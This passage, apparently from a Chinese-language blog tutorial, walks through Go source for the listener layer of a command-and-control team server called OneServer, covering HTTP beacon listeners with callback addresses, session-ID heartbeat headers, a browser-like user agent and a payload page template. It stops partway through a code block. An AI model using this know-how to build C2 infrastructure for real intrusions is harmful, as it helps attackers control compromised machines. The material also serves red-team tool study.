logs.Logger.Error(<span class="string">&quot;Invalid listener name&quot;</span>, zap.String(<span class="string">&quot;listener_name&quot;</span>, listenerConfig.ListenerName))  </span><br><span class="line">       ctx.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;code&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid listener name&quot;</span>&#125;)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    err = c.TeamServer.ListenerStart(listenerConfig.ListenerName, listenerConfig.ConfigType, listenerConfig.Config)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       logs.Logger.Error(<span class="string">&quot;Error in starting listener&quot;</span>, zap.Error(err))  </span><br><span class="line">       ctx.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;code&quot;</span>: <span class="literal">false</span>, <span class="string">&quot;message&quot;</span>: err.Error()&#125;)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    ctx.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Listener started successfully&quot;</span>, <span class="string">&quot;ok&quot;</span>: <span class="literal">true</span>&#125;)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 辅助函数  </span></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ValidListenerName</span><span class="params">(s <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;  </span><br><span class="line">    re := regexp.MustCompile(<span class="string">&quot;^[a-zA-Z0-9-_]+$&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> re.MatchString(s)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>utils/response/listener.go</code>。本项目中没有实际的作用，一般通过sync包同步到所有client</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> response  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;OneServer/utils/request&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> ListenerData <span class="keyword">struct</span> &#123;  </span><br><span class="line">    Name       <span class="type">string</span>               <span class="string">`json:&quot;listener_name&quot;`</span>  </span><br><span class="line">    Type       <span class="type">string</span>               <span class="string">`json:&quot;listener_type&quot;`</span>  </span><br><span class="line">    BindHost   <span class="type">string</span>               <span class="string">`json:&quot;listener_bind_host&quot;`</span>  </span><br><span class="line">    BindPort   <span class="type">string</span>               <span class="string">`json:&quot;listener_bind_port&quot;`</span>  </span><br><span class="line">    BeaconAddr <span class="type">string</span>               <span class="string">`json:&quot;listener_beacon_addr&quot;`</span>  </span><br><span class="line">    Status     <span class="type">string</span>               <span class="string">`json:&quot;listener_status&quot;`</span>  </span><br><span class="line">    Data       request.ConfigDetail <span class="string">`json:&quot;listener_data&quot;`</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>server/listener.go</code>：检查防重名，再调用策略层真正启动，成功后把完整元数据写入内存缓存，对外呈现“一键创建监听器”的简洁门面。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> server  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;OneServer/utils/request&quot;</span>  </span><br><span class="line">    <span class="string">&quot;errors&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(ts *TeamServer)</span></span> ListenerStart(listenerName <span class="type">string</span>, configType <span class="type">string</span>, config request.ConfigDetail) <span class="type">error</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> ts.Listeners.Contains(listenerName) &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;listener already exists&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    listenerData, err := ts.Handler.ListenerStart(listenerName, configType, config)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> err  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    listenerData.Name = listenerName  </span><br><span class="line">    listenerData.Type = configType  </span><br><span class="line">  </span><br><span class="line">    ts.Listeners.Put(listenerName, listenerData)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/types.go</code> 补充ListenerHandler接口的方法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> ListenerHandler <span class="keyword">interface</span> &#123;  </span><br><span class="line">    ListenerValid(listenerConfig request.ConfigDetail) <span class="type">error</span>  </span><br><span class="line">    ListenerStart(name <span class="type">string</span>, data request.ConfigDetail) (response.ListenerData, <span class="type">error</span>)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/listener.go</code> 按协议类型取出对应handler，先校验再启动，最后原样返回结果</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> handler  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;OneServer/utils/request&quot;</span>  </span><br><span class="line">    <span class="string">&quot;OneServer/utils/response&quot;</span>    </span><br><span class="line">    <span class="string">&quot;errors&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Handler)</span></span> ListenerStart(listenerName <span class="type">string</span>, configType <span class="type">string</span>, config request.ConfigDetail) (response.ListenerData, <span class="type">error</span>) &#123;  </span><br><span class="line">    listenerHandler, ok := h.ListenerHandlers[configType]  </span><br><span class="line">    <span class="keyword">if</span> !ok &#123;  </span><br><span class="line">       <span class="keyword">return</span> response.ListenerData&#123;&#125;, errors.New(<span class="string">&quot;handler not found&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    err := listenerHandler.ListenerValid(config)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> response.ListenerData&#123;&#125;, err  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> listenerHandler.ListenerStart(listenerName, config)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/listener/http_type.go</code> 暂时未用到TeamServer的方法，后续定义</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> listener  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;OneServer/utils/request&quot;</span>  </span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span>    </span><br><span class="line">    <span class="string">&quot;net/http&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> TeamServer <span class="keyword">interface</span> &#123;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> ListenerHTTP <span class="keyword">struct</span> &#123;  </span><br><span class="line">    ts TeamServer  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> HTTP <span class="keyword">struct</span> &#123;  </span><br><span class="line">    GinEngine *gin.Engine  </span><br><span class="line">    Server    *http.Server  </span><br><span class="line">    Config    request.ConfigDetail  </span><br><span class="line">    Name      <span class="type">string</span>  </span><br><span class="line">    Active    <span class="type">bool</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/listener/http_main.go</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> listener  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;OneServer/utils/request&quot;</span>  </span><br><span class="line">    <span class="string">&quot;OneServer/utils/response&quot;</span>    </span><br><span class="line">    <span class="string">&quot;errors&quot;</span>    </span><br><span class="line">    <span class="string">&quot;fmt&quot;</span>    </span><br><span class="line">    <span class="string">&quot;net&quot;</span>    </span><br><span class="line">    <span class="string">&quot;regexp&quot;</span>    </span><br><span class="line">    <span class="string">&quot;strconv&quot;</span>    </span><br><span class="line">    <span class="string">&quot;strings&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> (  </span><br><span class="line">    listenerHTTP *ListenerHTTP  </span><br><span class="line">    Listeners    []any  </span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewBeaconHTTPListener</span><span class="params">(ts any)</span></span> any &#123;  </span><br><span class="line">    listenerHTTP = &amp;ListenerHTTP&#123;  </span><br><span class="line">       ts: ts.(TeamServer),  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> listenerHTTP  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *ListenerHTTP)</span></span> ListenerValid(conf request.ConfigDetail) <span class="type">error</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 2. 必填项校验  </span></span><br><span class="line">    <span class="keyword">if</span> conf.HostBind == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;host_bind is required&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> conf.PortBind &lt; <span class="number">1</span> || conf.PortBind &gt; <span class="number">65535</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;port_bind must be in the range 1-65535&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(conf.CallbackAddresses) == <span class="number">0</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;callback_addresses is required&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> conf.HTTPMethod == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;http_method is required&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> conf.HBHeader == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;parameter_name is required&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> conf.UserAgent == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;user_agent is required&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> !strings.Contains(conf.PagePayload, <span class="string">&quot;&lt;&lt;&lt;PAYLOAD_DATA&gt;&gt;&gt;&quot;</span>) &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;web_page_output must contain &#x27;&lt;&lt;&lt;PAYLOAD_DATA&gt;&gt;&gt;&#x27; template&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 3. 回调地址校验  </span></span><br><span class="line">    <span class="keyword">for</span> _, addr := <span class="keyword">range</span> conf.CallbackAddresses &#123;  </span><br><span class="line">       addr = strings.TrimSpace(addr)  </span><br><span class="line">       <span class="keyword">if</span> addr == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">          <span class="keyword">continue</span>  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 拆分 host:port       host, portStr, err := net.SplitHostPort(addr)  </span></span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;invalid callback address (cannot split host:port): %s&quot;</span>, addr)  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 解析端口  </span></span><br><span class="line">       port, err := strconv.Atoi(portStr)  </span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> || port &lt;= <span class="number">0</span> || port &gt; <span class="number">65535</span> &#123;  </span><br><span class="line">          <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;invalid callback port: %s&quot;</span>, addr)  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 解析 IP 或域名  </span></span><br><span class="line">       <span class="keyword">if</span> ip := net.ParseIP(host); ip == <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="comment">// 域名简单校验  </span></span><br><span class="line">          <span class="keyword">if</span> <span class="built_in">len</span>(host) == <span class="number">0</span> || <span class="built_in">len</span>(host) &gt; <span class="number">253</span> &#123;  </span><br><span class="line">             <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;invalid callback host: %s&quot;</span>, addr)  </span><br><span class="line">          &#125;  </span><br><span class="line">          <span class="keyword">for</span> _, part := <span class="keyword">range</span> strings.Split(host, <span class="string">&quot;.&quot;</span>) &#123;  </span><br><span class="line">             <span class="keyword">if</span> <span class="built_in">len</span>(part) == <span class="number">0</span> || <span class="built_in">len</span>(part) &gt; <span class="number">63</span> &#123;  </span><br><span class="line">                <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;invalid callback host: %s&quot;</span>, addr)  </span><br><span class="line">             &#125;  </span><br><span class="line">          &#125;  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 4. URI 校验  </span></span><br><span class="line">    <span class="keyword">var</span> uriRegexp = regexp.MustCompile(<span class="string">`^/[a-zA-Z0-9\.\=\-]+(/[a-zA-Z0-9\.\=\-]+)*$`</span>)  </span><br><span class="line">    <span class="keyword">if</span> !uriRegexp.MatchString(conf.URI) &#123;  </span><br><span class="line">       <span class="keyword">return</span> errors.New(<span class="string">&quot;uri is invalid&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *ListenerHTTP)</span></span> ListenerStart(ListenerName <span class="type">string</span>, listenerConfig request.ConfigDetail) (response.ListenerData, <span class="type">error</span>) &#123;  </span><br><span class="line">  </span><br><span class="line">    listenerData, listener, err := l.HandlerListenerDataAndStart(ListenerName, listenerConfig)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> listenerData, err  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    Listeners = <span class="built_in">append</span>(Listeners, listener)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> listenerData, <span class="literal">nil</span>  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/listener/http_handler.go</code>实现HandlerListenerDataAndStart方法。根据传入的配置（conf）初始化一个 HTTP 监听器（HTTP 结构体），启动它，并返回监听器的元数据（ListenerData）和实例（* HTTP）。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> listener  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;OneServer/utils/request&quot;</span>  </span><br><span class="line">    <span class="string">&quot;OneServer/utils/response&quot;</span>    </span><br><span class="line">    <span class="string">&quot;crypto/rand&quot;</span>    </span><br><span class="line">    <span class="string">&quot;fmt&quot;</span>    </span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span>    </span><br><span class="line">    <span class="string">&quot;strconv&quot;</span>   </span><br><span class="line">     <span class="string">&quot;strings&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">const</span> (  </span><br><span class="line">    defaultProtocol = <span class="string">&quot;http&quot;</span>  </span><br><span class="line">    encryptKeyLen   = <span class="number">16</span>  </span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// ---------- 主函数 ----------  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *ListenerHTTP)</span></span> HandlerListenerDataAndStart(listenerName <span class="type">string</span>, conf request.ConfigDetail) (response.ListenerData, *HTTP, <span class="type">error</span>) &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> conf.RequestHeaders == <span class="literal">nil</span> &#123;  </span><br><span class="line">       conf.RequestHeaders = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> conf.ResponseHeaders == <span class="literal">nil</span> &#123;  </span><br><span class="line">       conf.ResponseHeaders = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> conf.HostHeader == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">       conf.RequestHeaders[<span class="string">&quot;Host&quot;</span>] = conf.HostHeader  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> conf.UserAgent == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">       conf.UserAgent = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> conf.HBHeader == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">       conf.HBHeader = <span class="string">&quot;X-Session-ID&quot;</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> conf.HBPrefix == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">       conf.HBPrefix = <span class="string">&quot;SESSIONID=&quot;</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> conf.EncryptKey == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">       key := <span class="built_in">make</span>([]<span class="type">byte</span>, encryptKeyLen)  </span><br><span class="line">       <span class="keyword">if</span> _, err := rand.Read(key); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">          <span class="keyword">return</span> response.ListenerData&#123;&#125;, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;generate key: %w&quot;</span>, err)  </span><br><span class="line">       &#125;  </span><br><span class="line">       conf.EncryptKey = <span class="type">string</span>(key)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    conf.Protocol = defaultProtocol  </span><br><span class="line">  </span><br><span class="line">    httpListener := &amp;HTTP&#123;  </span><br><span class="line">       GinEngine: gin.New(),  </span><br><span class="line">       Name:      listenerName,  </span><br><span class="line">       Config:    conf,  </span><br><span class="line">       Active:    <span class="literal">false</span>,  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> err := httpListener.Start(l.ts); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> response.ListenerData&#123;&#125;, <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;start listener: %w&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    listenerData := response.ListenerData&#123;  </span><br><span class="line">       BindHost:   conf.HostBind,  </span><br><span class="line">       BindPort:   strconv.Itoa(conf.PortBind),  </span><br><span class="line">       BeaconAddr: strings.Join(conf.CallbackAddresses, <span class="string">&quot;,&quot;</span>),  </span><br><span class="line">       Status:     <span class="string">&quot;Listen&quot;</span>,  </span><br><span class="line">       Data:       httpListener.Config,  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> !httpListener.Active &#123;  </span><br><span class="line">       listenerData.Status = <span class="string">&quot;Closed&quot;</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> listenerData, httpListener, <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handler/listener/http_listener.go</code> 暂时未实现processRequest路由处理方法，我的想法是在 <code>四、Beacon上线服务器并完成注册</code> 实现</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span 